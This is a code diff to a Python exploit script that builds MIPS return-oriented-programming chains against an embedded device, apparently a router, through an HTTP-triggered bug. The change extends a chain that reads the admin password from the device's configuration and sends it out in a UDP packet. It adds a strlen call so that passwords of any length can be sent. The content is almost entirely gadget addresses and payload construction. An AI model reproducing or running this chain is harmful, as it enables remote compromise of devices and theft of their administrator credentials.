@@ -416,6 +416,7 @@ elif args.command == 'http':
         socket_addr = 0x801293d0
         sleep_addr = 0x8019abac
         connect_addr = 0x80129028
+        strlen_addr = 0x801a717c
 
         # Build the ROP chain
         if (args.rop[0] == '1'): # print 'hello_core.con' to uart/telnet command line
@@ -870,7 +871,7 @@ elif args.command == 'http':
             chain += p32(0xdeadbeef) # ra
         elif (args.rop[0] == '5'): # Send a UDP packet containing the admin password (need to make it able to handle arbitrary length with strlen or something)
             # Add the strings to the sX registers, and set the ra to first gadget
-            chain += p32(0xdeadbeef) # s0 (0x1010200)
+            chain += p32(0xdeadbeef) # s0
             chain += p32(0xdeadbeef) # s1
             chain += p32(0xdeadbeef) # s2
             chain += p32(0xdeadbeef) # s3
@@ -915,14 +916,14 @@ elif args.command == 'http':
 
             # save the socket file descriptor for use later, might not use but oh well
             # 0x00185e38: sw $v0, ($s0); lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
-            chain += p32(0x80236c4c - 4) # s0
+            chain += p32(0x80236c4c - 4) # s0 (0x1010200 address)
             chain += p32(0x153d0 + base_address) # ra
 
             ####################################################
             ############## config load function ################
             ####################################################
 
-            # set a0 to be the id of the admin password
+            # Set a0 to be the id of the admin password
             # 0x000153d0: lw $a0, 4($s0); lw $ra, 4($sp); addiu $v0, $zero, 2; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8; 
             chain += p32(0x800089e4 + 0x7b58) # s0
             chain += p32(0x11e568 + base_address)
@@ -940,7 +941,45 @@ elif args.command == 'http':
             ## Now call config load
             # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
             chain += b'b' * 0x4
-            chain += p32(0x1a9f9c + base_address) # ra
+            chain += p32(0x19bc70 + base_address) # ra
+
+            ##############################################
+            ############### strlen (str) #################
+            ##############################################
+
+            # Regain control of s0
+            # 0x0019bc70: lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
+            chain += p32(pwd_buffer) # s0
+            chain += p32(0xb018c + base_address) # ra
+
+            # Move pwd buffer address into a0
+            # 0x000b018c: move $a0, $s0; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(0x57864 + base_address) # ra
+
+            # call strlen on the password buffer 
+
+            # Load address of strlen into v0
+            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
+            chain += p32(strlen_addr) # v0 - strlen address
+            chain += b'b' * 8
+            chain += p32(0x133d58 + base_address) # ra
+
+            # Call strlen and regain control
+            # 0x00133d58: jalr $v0; nop; move $s0, $v0; lw $ra, 0x24($sp); move $v0, $s0; lw $s2, 0x20($sp); lw $s1, 0x1c($sp); lw $s0, 0x18($sp); jr $ra; addiu $sp, $sp, 0x28; 
+            chain += b'b' * 0x18
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdeadbeef) # s1
+            chain += p32(0xdeadbeef) # s2
+            chain += p32(0x166168 + base_address) # ra
+
+            # 0x00166168: move $v1, $v0; lw $ra, 4($sp); move $v0, $v1; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8; 
+            chain += b'b' * 4
+            chain += p32(0x18f044 + base_address)
+
+            # 0x0018f044: move $a2, $v1; lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10; 
+            chain += b'b' * 0xc
+            chain += p32(0x1a9f9c + base_address)
 
             ##########################################################################################################################################
             ####### ssize_t sendto(int sockfd, const void *buf, size_t len, int flags, const struct sockaddr *dest_addr, socklen_t addrlen); #########
@@ -968,11 +1007,6 @@ elif args.command == 'http':
             # 0x0011e568: lw $a1, ($sp); lw $ra, 0xc($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x10; 
             chain += p32(pwd_buffer) # a1 (address of hello)
             chain += b'b' * 0x8
-            chain += p32(0x100790 + base_address) # ra
-
-            # Set a2 to be the length of the string 'hello\0' 
-            # 0x00100790: addiu $a2, $zero, 6; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8; 
-            chain += b'b' * 0x4
             chain += p32(0xbb6e4 + base_address) # ra
 
             # Set a3 to be zero (flags)
@@ -1059,19 +1093,6 @@ elif args.command == 'http':
         else:
             print("[-] Bad type")
             exit(1)
-
-        # elif (args.rop[0] == '4'): # turn on an led or something
-        #     # pAd address
-        #     pAd = 0x802d5d78
-
-        #     AndesLedEnhanceOp = 0x80109798 # pAd (a0), led_index (a1), on_time (a2), off_time (a3), led_param (t0)
-            
-        #     # Add the strings to the sX registers, and set the ra to first gadget
-        #     chain += p32(0xdeadbeef) # s0
-        #     chain += p32(0xdeadbeef) # s1
-        #     chain += p32(0xdeadbeef) # s2
-        #     chain += p32(0xdeadbeef) # s3
-        #     chain += p32(0x14d14 + base_address) # ra
 
         print(f"Length used: {len(chain)}")
         print(hexdump(chain))
